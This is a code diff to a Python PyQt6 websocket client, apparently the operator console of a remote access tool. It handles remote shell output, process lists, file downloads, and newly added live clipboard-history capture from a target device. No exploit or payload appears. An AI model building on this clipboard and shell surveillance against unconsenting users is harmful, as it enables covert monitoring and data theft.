@@ -5,6 +5,7 @@ import websockets
 import threading
 import json
 from PyQt6.QtCore import QObject, pyqtSignal
+import struct
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 from core import protocol
@@ -25,13 +26,12 @@ class AsyncSessionWorker(QObject):
     shell_exit = pyqtSignal(int)
     shell_cwd = pyqtSignal(str) # New Signal for CWD
     pm_data = pyqtSignal(list)  # Process list
-    
-    # ... (skipping unchanged signals) ...
-
 
     fm_data = pyqtSignal(list, str)  # Files, path
     fm_chunk = pyqtSignal(bytes)  # File download chunk
     clipboard_data = pyqtSignal(str)
+    clipboard_history = pyqtSignal(list)  # Clipboard history list
+    clipboard_entry = pyqtSignal(dict)  # New real-time clipboard entry
     sysinfo_data = pyqtSignal(dict)
 
     def __init__(self, target_url, target_id=None):
@@ -63,6 +63,15 @@ class AsyncSessionWorker(QObject):
                 if self.loop and self.loop.is_running():
                     asyncio.run_coroutine_threadsafe(self.ws.close(), self.loop)
                 self.ws = None
+
+    def send_msg(self, data: bytes):
+        """Send a message to the agent from UI thread."""
+        with self._lock:
+            if self.ws and self.loop and self.loop.is_running():
+                asyncio.run_coroutine_threadsafe(
+                    send_msg(self.ws, data),
+                    self.loop
+                )
 
     def _run_loop(self):
         self.loop = asyncio.new_event_loop()
@@ -200,12 +209,12 @@ class AsyncSessionWorker(QObject):
             # Shell responses
             elif opcode == protocol.OP_SHELL_OUTPUT:
                 try:
-                    self.shell_output.emit(payload.decode('utf-8'))
+                    text = payload.decode('utf-8')
+                    self.shell_output.emit(text)
                 except UnicodeDecodeError:
                     pass
             elif opcode == protocol.OP_SHELL_EXIT:
                 if len(payload) >= 4:
-                    import struct
                     code = struct.unpack('<i', payload[:4])[0]
                     self.shell_exit.emit(code)
             elif opcode == protocol.OP_SHELL_CWD:
@@ -219,8 +228,8 @@ class AsyncSessionWorker(QObject):
                 try:
                     data = json.loads(payload.decode('utf-8'))
                     self.pm_data.emit(data)
-                except Exception:
-                    pass
+                except Exception as e:
+                    print(f"[!] Error parsing PM data: {e}")
             
             # File Manager responses
             elif opcode == protocol.OP_FM_DATA:
@@ -229,8 +238,8 @@ class AsyncSessionWorker(QObject):
                     files = data.get('files', [])
                     path = data.get('path', '')
                     self.fm_data.emit(files, path)
-                except Exception:
-                    pass
+                except Exception as e:
+                    print(f"[!] Error parsing FM data: {e}")
             elif opcode == protocol.OP_FM_CHUNK:
                 self.fm_chunk.emit(payload)
             
@@ -241,18 +250,33 @@ class AsyncSessionWorker(QObject):
                 except UnicodeDecodeError:
                     pass
             
+            elif opcode == protocol.OP_CLIP_HISTORY_DATA:
+                try:
+                    data = json.loads(payload.decode('utf-8'))
+                    self.clipboard_history.emit(data)
+                except Exception as e:
+                    print(f"[!] Error parsing clipboard history data: {e}")
+            
+            elif opcode == protocol.OP_CLIP_ENTRY:
+                try:
+                    data = json.loads(payload.decode('utf-8'))
+                    self.clipboard_entry.emit(data)
+                except Exception as e:
+                    print(f"[!] Error parsing clipboard entry data: {e}")
+            
             # Settings responses
             elif opcode == protocol.OP_SYSINFO_DATA:
                 try:
                     data = json.loads(payload.decode('utf-8'))
                     self.sysinfo_data.emit(data)
-                except Exception:
-                    pass
+                except Exception as e:
+                    print(f"[!] Error parsing sysinfo data: {e}")
             
             elif opcode == protocol.OP_ERROR:
                 try:
                     error_msg = payload.decode('utf-8')
-                except Exception:
+                except Exception as e:
+                    print(f"[!] Error parsing error message: {e}")
                     error_msg = "Unknown"
                 
                 # Check for device-specific errors (don't disconnect)
